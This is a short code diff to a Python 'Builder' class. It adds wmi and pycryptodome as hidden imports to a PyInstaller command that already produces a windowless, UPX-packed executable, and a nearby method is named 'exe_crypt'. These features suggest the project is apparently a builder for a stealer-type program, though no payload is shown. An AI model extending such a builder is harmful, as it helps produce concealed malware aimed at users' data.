@@ -287,7 +287,7 @@ class Builder:
             icon = self.icon_name
         else:
             icon = "NONE"
-        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
+        os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def exe_crypt(self, filename):
